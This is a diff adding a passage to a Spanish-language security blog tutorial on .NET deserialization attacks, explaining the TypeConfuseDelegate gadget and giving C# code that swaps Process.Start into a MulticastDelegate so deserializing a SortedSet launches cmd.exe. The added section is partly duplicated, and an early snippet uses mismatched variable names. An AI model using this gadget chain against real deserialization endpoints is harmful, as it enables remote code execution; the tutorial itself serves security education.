@@ -9,6 +9,7 @@ draft: false
 tags:
   - Json
   - Deserializacion
+  - Gadget
   - web
   - XML 
   - .NET
@@ -300,7 +301,117 @@ Muy bien, ya entendiste e hiciste tu primer exploit. ¡Felicidades! Ya pasaste l
 
 Depende de tu escenario. Es decir, tienes que revisar el código y encontrar la sección que utilice algo de lo que mencioné en el documento. Te daré dos ejemplos que me he encontrado 2-3 veces.
 
+## XMLSerializer
+lunes 23 de feb.
 
 
+## Gadget TypeConfuseDelegate
+
+Para los dos últimos exploits, hemos utilizado el ObjectDataProvider gadget, pero existen muchos más gadgets y se descubren más todo el tiempo, así que echemos un vistazo a otro llamado TypeConfuseDelegate gadget.
+
+¿Que es?
+
+TypeConfuseDelegate es el nombre de un .NET Framework dispositivo de deserialización divulgado originalmente por James Forshaw en (Esta publicación del blog de Google Project Zero)[https://googleprojectzero.blogspot.com/2017/04/] desde mi punto de vista el mejor gadget que existe...
+
+Lo más importante que debemos saber:
+
+¿Como funciona?  
+Lo primero que debemos entender es que este gadget comienza con una clase llamada ComparisonComparer, que es una clase serializable, internal, dentro de la clase Comparer.
+
+ComparisonComparer extiende la clase Comparer y tiene una propiedad interna Comparison<T>. Comparison<T> es un tipo especial de variable llamada Delegate, lo que significa que se refiere a otro método.
+
+```csharp
+public delegate int Comparison<in T>(T x, T y);
+```
+## Gadget TypeConfuseDelegate
+
+Para los dos últimos exploits, hemos utilizado el ObjectDataProvider gadget, pero existen muchos más gadgets y se descubren más todo el tiempo, así que echemos un vistazo a otro llamado TypeConfuseDelegate gadget.
+
+¿Que es?
+
+TypeConfuseDelegate es el nombre de un .NET Framework dispositivo de deserialización divulgado originalmente por James Forshaw en (Esta publicación del blog de Google Project Zero)[https://googleprojectzero.blogspot.com/2017/04/] desde mi punto de vista el mejor gadget que existe...
+
+Lo más importante que debemos saber:
+
+¿Como funciona?  
+Lo primero que debemos entender es que este gadget comienza con una clase llamada ComparisonComparer, que es una clase serializable, internal, dentro de la clase Comparer.
+
+ComparisonComparer extiende la clase Comparer y tiene una propiedad interna Comparison<T>. Comparison<T> es un tipo especial de variable llamada Delegate, lo que significa que se refiere a otro método.
+
+```csharp
+public delegate int Comparison<in T>(T x, T y);
+````
+
+(Comparison)[[https://learn.microsoft.com/en-us/dotnet/api/system.comparison-1?view=net-7.0](https://learn.microsoft.com/en-us/dotnet/api/system.comparison-1?view=net-7.0)]
+
+Aquí lo más importante está dentro del método Compare; vemos que invoca al delegado. Lo más razonable es que, si podemos crear un ComparisonComparer y de alguna manera delegar el Process.Start como el método comparison, entonces esto lo invocaría... eso marca la teoría, veamos más... Recordar que esto se expone a través del método Comparer.Create.
+
+Entonces tenemos una manera de crear un ComparisonComparer, pero nuestro problema ahora es que Comparison espera un método que devuelva un int, y Process.Start devuelve un objeto Process.
+
+Aquí es donde MulticastDelegate entra en juego. Para decirlo de forma sencilla, un MulticastDelegate es solo una lista de métodos delegados que deben invocarse uno tras otro. Aunque todavía no podemos delegar Process.Start como un Comparison<T> debido al tipo de retorno, podemos explotar un problema de larga data del .NET Framework en el que las firmas de tipo no siempre se aplican y sobrescribir una función ya delegada en una instancia de MulticastDelegate con un método que devuelve un tipo diferente, en este caso Process.Start.
+
+Así que echemos un vistazo al comienzo del código del gadget:
+
+```csharp
+// delegamos un nuevo comparison
+Delegate Comparest = new Comparison<string>(string.Compare);
+
+// construimos el multicastdelegate 
+Comparison<string> multicastD = (Comparison<string>) MulticastDelegate.Combine(stringCompare, stringCompare);
+
+// usamos la instancia mencionada y pasamos el multicastdelegate
+IComparer<string> comparisonComparer = Comparer<string>.Create(multicastDelegate);
+```
+
+En este punto, tenemos una instancia de ComparisonComparer que invocará dos métodos string.Compare seguidos cuando se invoque el método Compare. Aquí es donde entra la "Type Confusion". Dentro de MulticastDelegate existe un campo privado llamado _invocationList que contiene los métodos delegados en el orden en que deben invocarse. Dado que este es un campo privado, no podemos actualizarlo directamente; sin embargo, podemos solucionar esto usando una clase llamada FieldInfo:
+
+```csharp
+FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
+
+// obtenemos la lista de invocación para el multicast
+object[] listainvok = multicastD.GetInvocationList();
+
+// sobrescribimos la segunda delegación de string.Compare con Process.Start
+listainvok[1] = new Func<string, string, Process>(Process.Start);
+fi.SetValue(multicastD, listainvok);
+```
+
+Ahora tenemos un MulticastDelegate que invoca comparest seguido de Process.Start cuando el ComparisonComparer invoca Compare. Pero aún no tenemos nada que invoque Compare. Aquí es donde entra SortedSet. SortedSet es un Set que se ordena automáticamente cada vez que se agrega un nuevo elemento (suponiendo que haya al menos dos elementos en total). Para realizar la clasificación, invoca Compare en la instancia interna de Comparer que puede ser especificada por el usuario, lo que significa que podemos proporcionar nuestro ComparisonComparer. Además, e igualmente importante, SortedSet se puede serializar y, tras la deserialización, agregará los elementos a una nueva instancia de SortedSet uno por uno, activando efectivamente la función Compare.
+
+En teoría, las últimas líneas de código serían sencillas...
+
+```csharp
+// Usando el sortedset con nuestro comparisoncomparer y añadiendo dos strings para cuando esto pase al Process.Start ejecutemos..
+SortedSet<string> sorset = new SortedSet<string>(comparisonComparer);
+sorset.Add("/c calc");
+sorset.Add("C:\\Windows\\System32\\cmd.exe");
+```
+
+Sé que suena confuso, pero velo de esta manera: TypeConfuseDelegate es un gadget de deserialización que explota una debilidad histórica en la verificación de tipos dentro del .NET Framework para lograr ejecución de código durante la deserialización. La técnica parte de un ComparisonComparer<T>, una clase interna serializable que encapsula un delegado Comparison<T> y lo invoca dentro de su método Compare. Mediante Comparer<T>.Create, es posible instanciar indirectamente este comparador e inyectarle un MulticastDelegate, que permite encadenar múltiples métodos. El truco central consiste en aprovechar la estructura interna de MulticastDelegate, específicamente su campo privado "_invocationList", y modificarlo vía reflexión ("FieldInfo") para sustituir uno de los métodos originalmente válidos (por ejemplo, "comparest") por "Process.Start", aun cuando su firma de retorno no coincide. Esta “confusión de tipos” funciona porque el runtime no siempre vuelve a validar estrictamente las firmas al manipular la lista interna de invocación. Finalmente, se utiliza "SortedSet<T>" como disparador: al agregar múltiples elementos, el conjunto invoca automáticamente "Compare" para ordenarlos y, como además es serializable, durante el proceso de deserialización reconstruye la colección y ejecuta nuevamente esa lógica. El resultado es que, al deserializar el objeto manipulado (por ejemplo, con "BinaryFormatter"), se ejecuta "Process.Start" con parámetros controlados, demostrando cómo la combinación de delegados, reflexión y colecciones ordenadas puede convertirse en una cadena coherente de ejecución arbitraria si el flujo de deserialización no está adecuadamente restringido.
+
+Al final quedaría esto así:
+
+```csharp
+Delegate comparest = new Comparison<string>(string.Compare);
+
+Comparison<string> multicastD = (Comparison<string>) MulticastDelegate.Combine(comparest, comparest);
+
+IComparer<string> comparisonComparer = Comparer<string>.Create(multicastD);
+
+FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
+
+object[] listainvok = multicastD.GetInvocationList();
+
+listainvok[1] = new Func<string, string, Process>(Process.Start);
+fi.SetValue(multicastD, listainvok);
+
+SortedSet<string> sorset = new SortedSet<string>(comparisonComparer);
+sorset.Add("/c calc");
+sorset.Add("C:\\Windows\\System32\\cmd.exe");
+```
+
+## Muchos más gadgets, mucho más trabajo, mucho más tiempo, más vulnerabilidades...
+
+Por algo estaré publicando posts de temas que nunca se acaban. No hablo de hacer cosas repetitivas con un cambio mínimo; cualquier tema publicado en mi blog será de cosas complejas que llevan una dedicación de fondo. Como sabrás si viste mi LinkedIn, me he desplazado mucho en otras áreas y he encontrado algunas cosas importantes. Pero si algo amo de la ciberseguridad y la tecnología en general es que no se detiene: pasan los días y técnicas que tal vez publique ya fueron parchadas y otras más se acaban de descubrir. Esto no significa que tú, como lector, hayas perdido el tiempo, sino que ahora tendrás una visión más avanzada sobre esto. Me encanta poder contarles que me encuentro escribiendo más gadgets y otro que me funcionó mucho.
 
 En unos dias continuo.... (**Explotación de vulnerabilidades de deserialización**)
